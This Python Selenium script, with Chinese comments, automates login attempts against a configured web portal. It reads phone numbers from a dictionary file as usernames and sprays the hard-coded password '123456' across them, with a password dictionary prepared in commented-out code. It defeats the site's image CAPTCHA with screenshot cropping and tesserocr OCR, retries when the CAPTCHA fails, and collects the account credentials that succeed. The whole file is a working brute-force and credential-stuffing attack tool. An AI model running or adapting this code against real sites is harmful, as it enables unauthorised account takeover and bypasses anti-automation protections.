# import pytesseract
from time import sleep

import tesserocr
from PIL import Image
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium_test import global_var


class IpsSign:

    def __init__(self):
        # 存储当前页面需要输入的用户密码
        self.single_row_dict = {}
        # 存储正确的用户密码
        self.correct_account_dict = {}
        # 存储当前异常行的账户密码并加入异常信息
        self.result_message_dict = {}
        # 异常的用户密码字典
        self.unusual_account_dict = {}
        # 错误判断标签
        #self.warn_xpath_string = global_var.hn_warn_string.replace("'","'")
        self.warn_xpath_string ="//span[@id='errorMessage']"
        # 获取driver
        self.driver = webdriver.Firefox(
            executable_path=r'F:\software\python\python3.7\Tools\geckodriver\geckodriver.exe')
        # self.driver = webdriver.Chrome(executable_path=r'F:\software\python\python3.7\Tools\geckodriver\chromedriver.exe')

        # 登录按钮、账户、密码的标签id
        self.login_button_id = global_var.hn_loginbutton_id
        self.user_name_id = global_var.hn_username_id
        self.password_id = global_var.hn_password_id

        # 从字典中获取数据
        self.merchant_code_dic_generator = self.get_merchant_code_dic_generator()

        self.user_name_dic_generator = self.get_user_name_dic_generator()

        self.user_name_pwd_generator = self.get_user_pwd_dic_generator()

        self.data_flag = True

    # 从字典中读取数据生成器
    def get_merchant_code_dic_generator(self):
        with open('dictionary/phone_number', 'r') as f:
            while True:
                lines = f.readlines(1000)
                if not lines:
                    break
                for line in lines:
                    yield line.replace("\n", "")

    def get_user_name_dic_generator(self):
        with open('dictionary/phone_number', 'r') as f:
            while True:
                lines = f.readlines(1000)
                if not lines:
                    break
                for line in lines:
                    yield line.replace("\n", "")

    def get_user_pwd_dic_generator(self):
        with open('dictionary/user_pwd_dic', 'r') as f:
            while True:
                lines = f.readlines(1000)
                if not lines:
                    break
                for line in lines:
                    yield line.replace("\n", "")

    # 从迭代器中读取一行数据
    def get_dict_data(self):
        try:
            self.single_row_dict['merchant_code_dic'] = next(self.merchant_code_dic_generator)

        except StopIteration:
            print("no merchant_code data")
            self.data_flag = False

        try:
            self.single_row_dict['user_name_dic'] = next(self.user_name_dic_generator)

        except StopIteration:
            print("no user_name data")
            self.data_flag = False

        try:
            self.single_row_dict['user_pwd_dic'] = next(self.user_name_pwd_generator)

        except StopIteration:
            print("no user_pwd data")
            self.data_flag = False

    # 获取driver
    def get_driver(self):
        self.driver.get(global_var.hn_login_url)

    # 转换到普通管理员登录
    def convert_to_ordinaryadmin(self):
        driver = self.driver
        driver.find_element_by_class_name("big1").click()
        driver.find_element_by_id("rdNormal").click()

    # 获取验证码图片
    def get_CAPTCHA_picture(self):
        driver = self.driver
        driver.get_screenshot_as_file('screen_shot/screenshot_file_1.png')
        element = driver.find_element_by_xpath("//img[@src='img.aspx']")
        left = int(element.location['x'])
        top = int(element.location['y'])
        right = int(element.location['x'] + element.size['width'])
        bottom = int(element.location['y'] + element.size['height'] + float(5))
        # 通过Image处理图像
        im = Image.open('screen_shot/screenshot_file_1.png')
        im = im.crop((left, top, right, bottom))
        im.save('screen_shot/screenshot_capture_1.png')

    # 读取验证码内容
    def get_CAPTCHA_content(self):
        str1 = "screen_shot/screenshot_capture_1.png"
        # 新建Image对象
        image = Image.open(str1)
        # 进行置灰处理
        image = image.convert('L')
        # 二值化阈值
        threshold = 225
        table = []
        for i in range(256):
            if i < threshold:
                table.append(0)
            else:
                table.append(1)
        # 通过表格转换成二进制图片，1的作用是白色，不然就全部黑色了
        image = image.point(table, "1")
        # image.show()
        self.result = tesserocr.image_to_text(image).replace("\x0c", "").replace("\n", "")
        print("当前验证码" + self.result)

    # 输入账户密码
    def enter_count_and_password(self):
        driver = self.driver

        driver.find_element_by_id(self.user_name_id).clear()
        print("当前账号" + self.single_row_dict['merchant_code_dic'])
        driver.find_element_by_id(self.user_name_id).send_keys(self.single_row_dict['merchant_code_dic'])

        driver.find_element_by_id(self.password_id).clear()
        print("当前密码" + self.single_row_dict['user_pwd_dic'])
        #driver.find_element_by_id(self.password_id).send_keys(self.single_row_dict['user_pwd_dic'])
        driver.find_element_by_id(self.password_id).send_keys("123456")

    # 输入验证码
    def enter_CAPTCHA(self):
        driver = self.driver
        driver.find_element_by_id("txtValidateCode").clear()
        driver.find_element_by_id("txtValidateCode").send_keys(self.result)

    # 点击登录
    def click_login(self):
        driver = self.driver
        driver.find_element_by_id(self.login_button_id).click()

    # 通过xpath_string判断标签是否存在
    def is_element_present(self, xpath_string):
        driver = self.driver
        try:
            element = driver.find_element_by_xpath(xpath_string)
            return True
        # 原文是except NoSuchElementException, e:
        except NoSuchElementException as e:
            # 发生了NoSuchElementException异常，说明页面中未找到该元素，返回False
            return False

    # 判断标签的值并返回
    def get_element_value(self, xpath_string):
        driver = self.driver
        element = driver.find_element_by_xpath(xpath_string)
        element_value = element.text
        return element_value

    # 一个登录的过程
    def driver_ordinaryadmin_login(self):
        self.get_driver()
        self.no_convert_to_login()

    # 在原页面重新输入数据登陆
    def no_convert_to_login(self):
        self.enter_count_and_password()
        self.click_login()

    # 使用原来的密码 只更改验证码登录
    def use_same_account_to_login(self):
        driver = self.driver
        driver.find_element_by_id(self.password_id).clear()
        driver.find_element_by_id(self.password_id).send_keys("123456")
        #driver.find_element_by_id(self.password_id).send_keys(self.single_row_dict['user_pwd_dic'])
        self.get_CAPTCHA_picture()
        self.get_CAPTCHA_content()
        self.enter_CAPTCHA()
        self.click_login()

    # 刷新页面并切换普通管理员登录
    def refresh_and_click_rdNormal(self):
        driver = self.driver
        driver.refresh()
        #driver.find_element_by_id("rdNormal").click()

    # 循环登录
    def loop_to_sign(self):

        # while data_flag:
        self.get_driver()

        driver = self.driver

        correct_account_count = 0
        sleep(5)

        while self.data_flag:
            sleep(0.5)
        #for i in range(0, 5):

            #如果错误元素不存在，说明是登录正确 进入到了账户页面
            if not self.is_element_present(self.warn_xpath_string):
                self.result_message_dict = {}
                self.result_message_dict.update(self.single_row_dict)
                self.result_message_dict['information'] = ["正确的用户密码"]
                self.correct_account_dict[correct_account_count] = [self.result_message_dict]
                correct_account_count += 1
                driver.back()
                self.refresh_and_click_rdNormal()

            elif self.get_element_value(self.warn_xpath_string) == "验证码不正确" or self.get_element_value(
                    self.warn_xpath_string) == "请输入验证码" or self.get_element_value(self.warn_xpath_string) == "验证码为四位数字":
                self.no_convert_to_login()

            elif self.get_element_value(self.warn_xpath_string) == global_var.hn_error_message[
                'ENUP'] or self.get_element_value(
                    self.warn_xpath_string) == "":
                self.get_dict_data()
                self.no_convert_to_login()

            #额外的错误信息，保存此时的账户密码留待查看
            else:
                self.result_message_dict = {}
                self.result_message_dict.update(self.single_row_dict)
                self.result_message_dict['information'] = [self.get_element_value(self.warn_xpath_string)]
                self.correct_account_dict[correct_account_count] = [self.result_message_dict]
                correct_account_count += 1
                self.get_dict_data()
                self.no_convert_to_login()

        print(self.correct_account_dict)


if __name__ == "__main__":
    T1 = IpsSign()
    T1.loop_to_sign()
